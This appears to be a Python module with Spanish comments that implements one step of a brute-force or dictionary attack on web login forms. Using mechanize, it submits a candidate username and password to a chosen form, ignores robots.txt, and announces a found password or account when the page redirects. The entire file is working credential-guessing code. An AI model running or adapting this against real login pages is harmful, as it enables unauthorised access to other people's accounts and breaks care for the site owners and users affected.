import mechanize
from colorama import init,Fore
import parametros as params

init()

def fb(url,usuario,c_usuario,c_pass,pass_,n):
    #url --> url del login de pagina web cuando se envia un dato invalido
    #usuario --> si conozco el usuario se almacena aca
    #c_pass --> atriqueta name de html de contraseña
    #c_usuario --> atriqueta name de html de usuario
    #n --> numero de formulario
    encontrada = False
    try:
        web = mechanize.Browser()
        encabezado = [
            ('Accept', 'text/javascript, text/html, application/xml, text/xml, */*'),
            ('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8'),
            ('User-Agent', 'Foobar'),
        ]

        web.set_handle_robots(False)
        web.addhandlers = encabezado

        web.open(url)

        web.select_form(nr=n)
        web[c_usuario] = usuario
        web[c_pass] = pass_

        pag2= web.submit()
        url2 = pag2.geturl()
        #si conozco el usuario
        if url2 != url and params.param.usuario != None:
            print(Fore.GREEN+f'contraseña encontrada: {pass_}')
            
            encontrada = True

        elif url2 != url and params.param.dic_u != None:
            print(Fore.GREEN+f'cuenta encontrada\nusuario:{usuario}\ncontraseña:{pass_}')

            encontrada = True

    except mechanize.ControlNotFoundError:
        print(Fore.RED+'no se encuentra el formulario o las casillas no conciden')
        return True
    finally:
        return encontrada